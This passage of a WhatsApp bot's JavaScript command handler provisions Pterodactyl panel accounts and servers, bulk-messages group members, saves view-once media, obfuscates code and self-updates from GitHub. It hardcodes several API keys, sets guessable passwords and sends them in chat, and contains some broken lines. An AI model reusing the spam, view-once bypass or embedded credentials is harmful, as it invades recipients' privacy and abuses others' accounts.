Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "ThugBotInc.ml"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account  ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*User ID: ${user.id}*`)
let ctf = `*Hi @${m.sender.split('@')[0]} just gave you access to the following panel account ⇩⇩*\n*👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*Successfully added User and Server*\n*Type:*\n
User Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": case "listserver": {
if (!ThugTheCreator) return reply(mess.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Here is a list of servers:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await ThugBotInc.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": case "deleteserver": {
if (!ThugTheCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*Server not found*')
reply('*Successfully deleted Server.*')
}
break
case 'enc': case 'encrypt': case 'obfuscate': {
if (!q) return reply(`*Example${prefix+command} <line of code>*`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break
case 'pushcontact': {
    if (!ThugTheCreator) return reply(mess.owner)
      if (!m.isGroup) return reply(mess.group)
    if (!text) return reply(`*Provide a text*`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    reply(`*Success in pushing the message to contacts*`)
    for (let pler of mem) {
    ThugBotInc.sendMessage(pler, { text: q})
     }  
     reply(`*Done*`)
      }
      break
case "pushcontactv2":{
if (!ThugTheCreator) return reply(mess.owner)
if (!q) return reply(`*Incorrect Usage*\n*Example: ${prefix+command} idgc|text*`)
await loading()
const metadata2 = await ThugBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
ThugBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
reply(`*Success*`)
}
break
case 'pushcontactv3':
if (!ThugTheCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`*Usage :${prefix+command} pause|text‼️*\n*Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second*`)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ThugBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await ThugBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await ThugBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
reply(`*Success*`)
break    
case 'vv': case 'readviewonce': {

  if (!m.quoted) return m.reply("*Reply to an image/video that you want to view*");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return m.reply("*This is not a view-once message.*");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return m.reply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await ThugBotInc.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await ThugBotInc.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await ThugBotInc.sendMessage(m.chat, { react: { text: '🌼', key: m.key } }); 
}
break


case 'statustext': 
            case 'upswteks': {
              if (!ThugTheCreator) return reply(mess.owner)
               if (!q) return reply(`*kindly provide a text*\n*Example : ${prefix+command} Hey everyone*`)
               await ThugBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#9e9e9e', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply(`*Successfully uploaded '${q}' to your status*`)
            }
            break
case 'statusaudio':
            case 'upswaudio': {
               if (!ThugTheCreator) return reply(mess.owner)
               if (/audio/.test(mime)) {
                  var audiosw = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
                  await ThugBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#9e9e9e',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await reply(`*Audio successfully uploaded to your status*\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`)
               } else {
                  reply(`*Reply to an audio*\n*Example ${prefix+command} then reply to an audio*`)
               }
            }
            break

case 'statusimg':
            case 'statusimg':
            case 'upswimg': {
              if (!ThugTheCreator) return reply(mess.owner)
               if (/image/.test(mime)) {
                  var imagesw = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
                  await ThugBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await reply('*Image successfully uploaded to your status*\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™')
               } else {
                  reply(`*Reply to a video or image*\n*Example ${prefix+command} then reply to a video*`)
               }
            }
            break
            case 'statusvid':
            case 'upswvideo': {
              if (!ThugTheCreator) return reply(mess.owner)
               if (/video/.test(mime)) {
                  var videosw = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
                  await ThugBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await reply('*Video successfully uploaded to your status*\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™')
               } else {
                  reply(`*Reply to a video*\n*Example : ${prefix+command} then tag/reply to a video*`)
               }
            }
            break
 
    
       case 'socials':
case 'socialmedia': {
  reply(`*Follow our socials on ⬇️*\n╭─────────────────────✿︎
│   ✿︎  │  ༺ 𝕾𝖔𝖈𝖎𝖆𝖑𝖘 ༻  │ ✿︎
╰─────────────────────✿
│  ❦︎ │ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 : https://www.youtube.com/@Thugnf1cent
│  ❦︎ │ 𝕿𝖊𝖑𝖊𝖌𝖗𝖆𝖒 𝕮𝖍𝖆𝖓𝖓𝖊𝖑 : https://t.me/ThugBotInc
│  ❦︎ │ 𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕 𝕮𝖍𝖆𝖓𝖓𝖊𝖑 : https://whatsapp.com/channel/0029VaoOiuwDp2QH070eTE01
╰─────────────────────✿
`);
  break;
}
case 'antispam': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
  if (!isBotAdmins) return reply(mess.botadmin)

  const chat = db.data.chats[frommeky];
  const action = args[0]?.toLowerCase();

  if (action === 'on') {
    chat.antispam = true;
    reply(`*${command} has been enabled*`);
  } else if (action === 'off') {
    chat.antispam = false;
    reply(`*${command} has been disabled*`);
  } else {
    reply(`*Usage: ${prefix}${command} [on/off]*`);
  }
  break;
}

case 'song': {
if (!text) return reply(`*Example*: ${prefix + command} Faded By Alan Walker`)
const randomReduction = Math.floor(Math.random() * 5) + 1;
let search = await yts(text);
let telaso = search.all[0].url;
let body = `*ᎧᏒᏋᏦᎥ Ꮙ2*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*\n*Please reply ${prefix}audio/video to download*`;
ThugBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: body }, { quoted: m });
global.db.data.users[m.sender].lastSearchUrl = telaso; 
}
break
case 'update': { 
    if (!ThugTheCreator) return reply('*❌ You are not authorized to use this command.*');

    // Update the paths to writable locations outside the current directory
    const zipUrl = 'https://github.com/DEMONST3R-CODER/Oreki_V2/archive/refs/heads/main.zip';
    const tempZipPath = path.join(__dirname, '../temp.zip'); // Store in the parent directory
    const extractPath = path.join(__dirname, '../temp_extract'); // Store in the parent directory

    try {
        await loading() // Show wait sticker

        // Step 1: Download the ZIP file
        const writer = fs.createWriteStream(tempZipPath);
        https.get(zipUrl, (response) => response.pipe(writer));

        writer.on('finish', () => {
            console.log('✅ ZIP file downloaded successfully.');

            // Step 2: Check ZIP file integrity (basic size check)
            const zipSize = fs.statSync(tempZipPath).size;
            if (zipSize === 0) {
                console.error('❌ ZIP file is empty. Aborting extraction.');
                return reply('*❌ ZIP file is empty. Please try again later.*');
            }

            // Ensure the extraction directory exists
            if (!fs.existsSync(extractPath)) {
                fs.mkdirSync(extractPath, { recursive: true });
            }

            // Step 3: Extract the ZIP file
            try {
                const unzip = unzipper.Extract({ path: extractPath });
                fs.createReadStream(tempZipPath).pipe(unzip);

                unzip.on('close', () => {
                    console.log('✅ ZIP file extracted successfully.');

                    // Step 4: Update files
                    const files = fs.readdirSync(extractPath);

                    for (const file of files) {
                        const currentPath = path.join(extractPath, file);
                        const destPath = path.join(__dirname, '../', file); // Adjusted destination path (parent directory)

                        const stat = fs.statSync(currentPath);

                        if (stat.isDirectory()) {
                            if (!fs.existsSync(destPath)) {
                                fs.mkdirSync(destPath);
                            }
                            const innerFiles = fs.readdirSync(currentPath);
                            innerFiles.forEach(innerFile => {
                                const innerFilePath = path.join(currentPath, innerFile);
                                const innerDestPath = path.join(destPath, innerFile);
                                fs.copyFileSync(innerFilePath, innerDestPath);
                                console.log(`Updated: ${innerFile}`);
                            });
                        } else {
                            fs.copyFileSync(currentPath, destPath);
                            console.log(`Updated: ${file}`);
                        }
                    }

                    console.log('✅ Files updated successfully.');

                    // Step 5: Clean up
                    fs.unlinkSync(tempZipPath);
                    fs.rmSync(extractPath, { recursive: true, force: true });
                    console.log('🧹 Temporary files cleaned.');

                    // Step 6: Restart the bot
                    reply('*Bot has been updated.🔥*\n*Restarting...*');
                    sleep(3000); // Optional delay before restarting
                    process.exit();
                });

                unzip.on('error', (err) => {
                    console.error('❌ Error during extraction:', err);
                    if (err.code !== 'FILE_ENDED') {
                        reply('*Failed to extract the ZIP. Please try again later. 😥*');
                    }
                });
            } catch (extractError) {
                console.error('❌ Error during extraction process:', extractError);
                reply('*Failed to extract the ZIP. Please try again later.😥*');
            }
        });

        writer.on('error', (err) => {
            console.error('❌ Error downloading ZIP:', err);
            reply('*Failed to download the ZIP. Please try again later.😔*');
        });

    } catch (error) {
        console.error("❌ General error during update process:", error.message);
        reply('*An error occurred during the update process.😔*');
    }

    // Synchronous sleep function
    function sleep(ms) {
        const end = Date.now() + ms;
        while (Date.now() < end) {}
    }
}
break;
case 'leave': case 'exit': {
if (!ThugTheCreator) return reply(mess.owner)
await ThugBotInc.groupLeave(m.chat)
await reply('*Successful*')
            }
            break
case 'chat': {
            	if (!ThugTheCreator) return reply(mess.owner)
                if (!q) return reply(`*Option : 1. mute*\n*2. unmute*\n*3. archive*\n*4. unarchive*\n5. read\n*6. unread*\n*7. delete*`)
                if (args[0] === 'mute') {
                    ThugBotInc.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    ThugBotInc.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    ThugBotInc.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    ThugBotInc.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    ThugBotInc.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    ThugBotInc.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    ThugBotInc.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break


case 'removebg': case 'bgremove': {
    if (!quoted) return reply(`*Send/Reply to an Image With Caption ${prefix + command}*`)
    if (!/image/.test(mime)) return reply(`*Send/Reply to an Image With Caption ${prefix + command}*`)
    if (/webp/.test(mime)) return reply(`*Send/Reply to an Image With Caption ${prefix + command}*`)

    const remobg = require('remove.bg')
    const fs = require('fs')
    const path = require('path')

    let apirnobg = [
        'q61faXzzR5zNU6cvcrwtUkRU',
        'S258diZhcuFJooAtHTaPEn4T',
        '5LjfCVAp4vVNYiTjq9mXJWHF',
        'aT7ibfUsGSwFyjaPZ9eoJc61',
        'BY63t7Vx2tS68YZFY6AJ4HHF',
        '5Gdq1sSWSeyZzPMHqz7ENfi8',
        '86h6d6u4AXrst4BVMD9dzdGZ',
        'xp8pSDavAgfE5XScqXo9UKHF',
        'dWbCoCb3TacCP93imNEcPxcL'
    ]
    
    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
    let inputFile = `./src/remobg-${getRandom('')}`
    let outputFile = `./src/hremo-${getRandom('.png')}`

    try {
        await loading() // Assuming you have a loading function
        let localFile = await ThugBotInc.downloadAndSaveMediaMessage(quoted, inputFile)

        await remobg.removeBackgroundFromImageFile({
            path: localFile,
            apiKey: apinobg,
            size: "regular",
            type: "auto",
            scale: "100%",
            outputFile
        })

        let imgBuffer = fs.readFileSync(outputFile)
        await ThugBotInc.sendMessage(m.chat, { image: imgBuffer, caption: mess.success }, { quoted: m })

        // Cleanup
        fs.unlinkSync(localFile)
        fs.unlinkSync(outputFile)
    } catch (error) {
        console.error("RemoveBG Error:", error)
        reply("❌ Failed to remove background. Try again later.")
    }
}
break

	    case 'emojimix': {
if (!text) return reply(`*Example :* ${prefix + command} 🥺+😩*`)
let [emoji1, emoji2] = q.split`+`
let kuntuh = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of kuntuh.results) {
let encmedia = await ThugBotInc.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'editinfo': {
    if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)

    if (args[0] === 'open') {
        await ThugBotInc.groupSettingUpdate(m.chat, 'unlocked')
            .then(() => reply(`Successfully Opened Edit Group Info`))
            .catch((err) => reply(jsonformat(err)));
    } else if (args[0] === 'close') {
        await ThugBotInc.groupSettingUpdate(m.chat, 'locked')
            .then(() => reply(`*Successfully Closed Edit Group Info*`))
            .catch((err) => reply(jsonformat(err)));
    } else {
        reply(`*Usage: editinfo open or editinfo close*`);
    }
}
break;
case 'jail': case 'pixelate': case 'blur': case 'imagesketch': case 'triggeredwebp': case 'shit': case 'burn': case 'invert': case 'wanted': case 'rip': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption ${prefix + command}*`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
                ThugBotInc.sendMessage(m.chat, { image: buf, caption: success }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'gayeffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption ${prefix + command}*`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/gay?url=${anu}`)
                ThugBotIncThugBotInc.sendMessage(m.chat, { image: buf, caption: success }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'deleteeffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/delete?url=${anu}`)
                ThugBotInc.sendMessage(m.chat, { image: buf, caption: success }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'framed': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/fotojatoh?url=${anu}`)
                ThugBotInc.sendMessage(m.chat, { image: buf, caption: success }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'beautifuleffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption ${prefix + command}*`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/beautiful?url=${anu}`)
                ThugBotInc.sendMessage(m.chat, { image: buf, caption: success }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
            case 'readmore': {
                if (!text) return reply(`*Example : ${prefix + command} Hello*`)
                anu = await fetchJson(`https://cililitan.herokuapp.com/api/readmore?teks=${text}`)
               reply(`${anu.result}`)
            }
            break

case 'leveling':
  if (!ThugTheCreator) return reply(mess.owner)
   if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (args.length < 1) return reply('*Type on to enable*\n*Type off to disable*')
if (args[0] === 'on'){
if (isLeveling) return reply(`*Already activated*`)
_leveling.push(from)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
reply('*Leveling activated*')
} else if (args[0] === 'off'){
let anu = _leveling.indexOf(from)
_leveling.splice(anu, 1)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
reply('*Leveling deactivated*')
} 
break
case 'alive':

const audiovn = "./T-Media/alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "༺ 🌼 ᎧᏒᏋᏦᎥ Ꮙ2 🌼 ༻ ",
          body: "© 𝙰 𝙿𝚁𝙾𝙳𝚄𝙲𝚃 𝙾𝙵 𝚃𝙷𝚄𝙶𝙽𝙸𝙵𝙸𝙲𝙴𝙽𝚃 𝚃𝙴𝙲𝙷™",
          thumbnailUrl: "https://i.imgur.com/SEM0qco.jpeg",
          sourceUrl: "https://whatsapp.com/channel/0029VaoOiuwDp2QH070eTE01",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await ThugBotInc.sendMessage(m.chat, dooc, {quoted: m});


break

case 'when': {
    if (!text) return reply(`*Ask a question!*\n*Example: ${prefix + command} will I get married?*`);

    let kapan = [
        "⏳ In 1 day... but don't get too excited.", "📅 2 days, if you survive till then.", "⏳ 3 days, unless you mess it up.", 
        "📆 4 days... or maybe never. Who knows?", "⏳ 5 days, but only if you behave.", "📆 6 days. Stay hopeful, clown 🤡.", 
        "⏳ 7 days. Just like that horror movie. Beware!", "📆 8 days. Time is ticking... faster than your brain.", 
        "⏳ 9 days. Maybe try being patient for once?", "📆 10 days. But with your luck, probably longer.", 
        "⏳ 15 days. If you stop being annoying.", "📆 20 days. That’s a long wait, huh?", 
        "⏳ 30 days. Or just keep dreaming about it.", "📆 50 days. Maybe go touch some grass 🌿?", 
        "⏳ 100 days. If you don’t mess things up before then.", "📅 5 months. By then, I hope you’ve improved.", 
        "📆 1 year. Patience is a virtue… one that you clearly lack.", "🗓️ 2 years. If you live that long.", 
        "⏳ 5 years. Good luck staying relevant until then.", "📆 10 years. Yeah, keep dreaming buddy.", 
        "🚀 Tomorrow! But that’s highly unlikely for you.", "✨ The day after tomorrow… or never. Surprise!", 
        "📅 This week! But only if you stop being a clown 🤡.", "📆 This month! Time to stop being lazy.", 
        "🔮 Soon… maybe. Maybe not. Figure it out.", "💭 In your dreams… literally.", "😂 Never. Accept your fate.", 
        "🤷 Someday… but I wouldn’t bet on it.", "😆 When pigs fly!", "🔥 Right now! Oh wait… false alarm.", 
        "🦄 When unicorns exist!", "🕵️‍♂️ When you find your brain.", "⏳ Soon, but don’t get your hopes up.", 
        "🎭 When you stop being delusional.", "🐒 When monkeys evolve faster than you.", "🤡 When you stop acting like a clown.", 
        "👻 When ghosts start giving life advice.", "🛸 When aliens invade and take you away.", "🧐 When you start using your brain.", 
        "🙄 When you finally do something productive.", "😂 When you stop asking dumb questions.", 
        "🥴 When I feel like answering properly.", "💀 When hell freezes over.", "🐸 When Kermit the Frog becomes president.", 
        "🦷 When you finally brush your teeth properly.", "🛑 Never. Give up already.", "🍕 After you buy me pizza.", 
        "🎩 When you learn some manners.", "🚪 Close the door on this question and move on.", "🤬 You really want me to answer that?"
    ];
    
    let koh = kapan[Math.floor(Math.random() * kapan.length)];
    let jawab = `*${command} ${text}*\n*🕒 Answer: ${koh}*`;

    await reply(jawab);
}
break;

case 'what': {
    if (!text) return reply(`*Ask a question!* Example: ${prefix + command} is your name?`);

    let lel = [
        "🤷‍♂️ Ask your GF, if you have one.", "🙃 I don't know, and neither do you.", "😆 Ask your dad, if he’s still around.", 
        "😂 Why are you even asking me this?", "🤖 I'm just an AI, but even I know that was dumb.", 
        "😎 Figure it out, genius.", "😂 Bro, even Google would laugh at that.", 
        "🤔 You sure you have a functioning brain?", "🙄 I expected a better question from a human. My bad.", 
        "💡 Go outside, touch some grass, and rethink your life choices.", "👀 I see what you're trying to do… and I don't care.", 
        "🤣 Haha, nice try, but I'm not falling for that nonsense.", "🥴 That question just gave me a headache.", 
        "🤨 Sounds like a you problem.", "🧐 What a mystery! Even Sherlock Holmes wouldn’t care.", 
